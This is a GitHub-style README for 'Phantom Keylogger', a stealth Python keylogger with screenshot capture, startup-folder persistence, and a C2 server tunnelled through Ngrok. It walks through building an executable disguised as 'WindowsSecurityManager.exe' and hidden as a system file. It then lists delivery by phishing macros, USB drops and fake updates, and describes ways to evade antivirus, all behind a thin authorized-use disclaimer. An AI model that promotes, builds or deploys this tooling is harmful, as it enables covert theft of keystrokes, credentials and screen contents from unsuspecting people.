# Phantom Keylogger 

![Red Team](https://img.shields.io/badge/OPERATION-PHANTOM-red)
![Stealth](https://img.shields.io/badge/STEALTH-ACTIVE-black)
![Version](https://img.shields.io/badge/VERSION-1.1.0-critical)

## 🎯 MISSION BRIEF

**Phantom Keylogger** is an advanced, stealth-enabled keystroke and visual intelligence gathering system. Built with operational security as the primary objective, this tool provides persistent surveillance capabilities while maintaining minimal footprint on target systems during authorized red team engagements.

### ⚠️ OPERATIONAL PROTOCOLS

**AUTHORIZED USE CASES:**  
    - Authorized penetration testing operations  
    - Red team exercises with written Rules of Engagement  
    - Security research in controlled environments  
    - Defensive security control validation  

**PROHIBITED OPERATIONS:**  
    - Unauthorized surveillance activities  
    - Illegal intrusion or data exfiltration  
    - Personal privacy violation  
    - Any non-authorized offensive operations  

**OPERATORS ASSUME FULL LEGAL RESPONSIBILITY FOR PROPER DEPLOYMENT**


## 🛡️ OPERATIONAL CAPABILITIES

### Intelligence Collection Modules
- **Keystroke Interception**: Advanced keyboard capture with special key translation
- **Visual Surveillance**: Automated screenshot capture at configurable intervals  
- **System Reconnaissance**: Hostname, username, and environment data collection
- **Persistent Implant**: Continuous monitoring with automatic recovery mechanisms

### Operational Security Features
- **Zero UI Footprint**: Completely invisible to end users
- **Persistence Mechanisms**: Automatic startup installation
- **Anti-Forensics**: Mutex-based single instance protection
- **File System Obfuscation**: Hidden file attributes and legitimate naming

## 🚀 OPERATIONAL DEPLOYMENT

### Phase 1: Command & Control Infrastructure

```bash
# 1. Clone operational repository
git clone https://github.com/MattiaAlessi/phantom-keylogger
cd phantom-keylogger

# 2. Install operational dependencies
pip install -r requirements.txt

# 3. Deploy C2 server
python server.py
```

### Phase 2: Payload Generation

```bash
# Generate stealth executable
python build.py
```

**Output**: dist/WindowsSecurityManager.exe

### Phase 3: Target Deployment

Delivery Methods:
- **Phishing Campaigns**: Document macros or fake installers
- **Physical Access**: USB drop attacks
- **Lateral Movement**: Compromised internal shares
- **Social Engineering**: Fake software updates


### Phase 4: Visual tool
```bash
# Start the GUI interface 
python manager.py
```


## 🔧 TECHNICAL SPECIFICATIONS

### Architecture Overview

```text
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   TARGET        │    │   C2 TUNNEL      │    │   OPERATOR      │
│                 │    │                  │    │                 │
│  ┌─────────────┐│    │  ┌─────────────┐ │    │  ┌─────────────┐│
│  │ Stealth     ││    │  │ Ngrok       │ │    │  │ Management  ││
│  │ Keylogger   ├───────►│ Tunnel      ├───────►│ Console      ││
│  │             ││    │  │             │ │    │  │             ││
│  └─────────────┘│    │  └─────────────┘ │    │  └─────────────┘│
└─────────────────┘    └──────────────────┘    └─────────────────┘
```

### Persistence Mechanisms

Startup Folder: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\  
Easily accessible by digiting **shell:startup** in the dialog box (WIN+r)
File Name: WindowsSecurityManager.exe  
Attributes: Hidden system file  


## 🛡️ DEFENSE EVASION TECHNIQUES

### AV/EDR Bypass Methods  
- Legitimate Naming: Uses Windows security-related names
- Behavioral Obfuscation: Normal system process patterns
- Network Blending: HTTPS traffic to legitimate-looking domains
- Memory Operations: No suspicious API calls or injection

### Operational Security Measures
- No Local Artifacts: All data transmitted remotely via encrypted channels
- Standard Tooling: Utilizes only common, whitelisted Python libraries
- Clean Exit Procedures: No crash dumps or forensic artifacts left behind

### 📊 OPERATIONAL METRICS
- Detection Evasion: Successfully tested against multiple security solutions with multiple Antivirus installed
- Data Exfiltration: Encrypted, real-time transmission to C2
- Operational Uptime: Continuous monitoring with auto-recovery